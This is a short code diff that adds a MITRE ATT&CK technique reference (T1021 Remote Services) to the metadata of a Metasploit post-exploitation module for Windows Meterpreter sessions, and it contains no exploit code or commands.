@@ -22,7 +22,8 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => 'Borja Merino <bmerinofe[at]gmail.com>',
         'References' => [
-          [ 'URL', 'https://www.youtube.com/watch?v=vdppEZjMPCM&hd=1' ]
+          [ 'URL', 'https://www.youtube.com/watch?v=vdppEZjMPCM&hd=1' ],
+          [ 'ATT&CK', Mitre::Attack::Technique::T1021_REMOTE_SERVICES ]
         ],
         'Platform' => 'win',
         'SessionTypes' => [ 'meterpreter' ],
